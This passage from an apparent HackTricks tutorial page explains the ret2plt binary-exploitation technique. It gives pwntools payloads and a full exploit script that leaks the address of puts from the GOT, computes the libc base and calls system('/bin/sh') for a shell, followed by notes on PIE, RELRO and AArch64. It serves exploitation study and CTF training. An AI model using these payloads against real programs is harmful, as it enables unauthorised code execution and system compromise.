_body: "# Ret2plt\n\n{{#include ../../../banners/hacktricks-training.md}}\n\n## Basic Information\n\nThe goal of this technique\
  \ would be to **leak an address from a function from the PLT** to be able to bypass ASLR. This is because if, for example,\
  \ you leak the address of the function `puts` from the libc, you can then **calculate where is the base of `libc`** and\
  \ calculate offsets to access other functions such as **`system`**.\n\nThis can be done with a `pwntools` payload such as\
  \ ([**from here**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got)):\n\n```python\n# 32-bit ret2plt\npayload\
  \ = flat(\n    b'A' * padding,\n    elf.plt['puts'],\n    elf.symbols['main'],\n    elf.got['puts']\n)\n\n# 64-bit\npayload\
  \ = flat(\n    b'A' * padding,\n    POP_RDI,\n    elf.got['puts']\n    elf.plt['puts'],\n    elf.symbols['main']\n)\n```\n\
  \nNote how **`puts`** (using the address from the PLT) is called with the address of `puts` located in the GOT (Global Offset\
  \ Table). This is because by the time `puts` prints the GOT entry of puts, this **entry will contain the exact address of\
  \ `puts` in memory**.\n\nAlso note how the address of `main` is used in the exploit so when `puts` ends its execution, the\
  \ **binary calls `main` again instead of exiting** (so the leaked address will continue to be valid).\n\n> [!CAUTION]\n\
  > Note how in order for this to work the **binary cannot be compiled with PIE** or you must have **found a leak to bypass\
  \ PIE** in order to know the address of the PLT, GOT and main. Otherwise, you need to bypass PIE first.\n\nYou can find\
  \ a [**full example of this bypass here**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass). This\
  \ was the final exploit from that **example**:\n\n<details>\n<summary>Full exploit example (ret2plt leak + system)</summary>\n\
  \n```python\nfrom pwn import *\n\nelf = context.binary = ELF('./vuln-32')\nlibc = elf.libc\np = process()\n\np.recvline()\n\
  \npayload = flat(\n    'A' * 32,\n    elf.plt['puts'],\n    elf.sym['main'],\n    elf.got['puts']\n)\n\np.sendline(payload)\n\
  \nputs_leak = u32(p.recv(4))\np.recvlines(2)\n\nlibc.address = puts_leak - libc.sym['puts']\nlog.success(f'LIBC base: {hex(libc.address)}')\n\
  \npayload = flat(\n    'A' * 32,\n    libc.sym['system'],\n    libc.sym['exit'],\n    next(libc.search(b'/bin/sh\\x00'))\n\
  )\n\np.sendline(payload)\n\np.interactive()\n```\n\n</details>\n\n## Modern considerations\n\n- **`-fno-plt` builds** (common\
  \ in modern distros) replace `call foo@plt` with `call [foo@got]`. If the binary has no `foo@plt` stub, you can still leak\
  \ the resolved address with `puts(elf.got['foo'])` and then **return directly to the GOT entry** (`flat(padding, elf.got['foo'])`)\
  \ to jump into libc once lazy binding has completed.\n- **Full RELRO / `-Wl,-z,now`**: GOT is read‑only but ret2plt still\
  \ works for leaks because you only read the GOT slot. If the symbol was never called, your first ret2plt will also perform\
  \ lazy binding and then print the resolved slot.\n- **ASLR + PIE**: if PIE is enabled, first leak a code pointer (e.g.,\
  \ saved return address, function pointer, or `.plt` entry via another format‑string/infoleak) to compute the PIE base, then\
  \ build the ret2plt chain with the rebased PLT/GOT addresses.\n- **Non‑x86 architectures with BTI/PAC (AArch64)**: PLT entries\
  \ are valid BTI landing pads (`bti c`), so when exploiting on BTI‑enabled binaries prefer jumping into the PLT stub (or\
  \ another BTI‑annotated gadget) instead of directly into a libc gadget without BTI, otherwise the CPU will raise `BRK`/`PAC`\
  \ failures.\n- **Quick resolution helper**: if the target function is not yet resolved and you need a leak in a single shot,\
  \ chain the PLT call twice: first `elf.plt['foo']` (to resolve) then again `elf.plt['foo']` with the GOT address as argument\
  \ to print the now‑filled slot.\n\n## Other examples & References\n\n- [https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html)\n\
  \  - 64 bit, ASLR enabled but no PIE, the first step is to fill an overflow until the byte 0x00 of the canary to then call\
  \ puts and leak it. With the canary a ROP gadget is created to call puts to leak the address of puts from the GOT and the\
  \ a ROP gadget to call `system('/bin/sh')`\n- [https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html)\n\
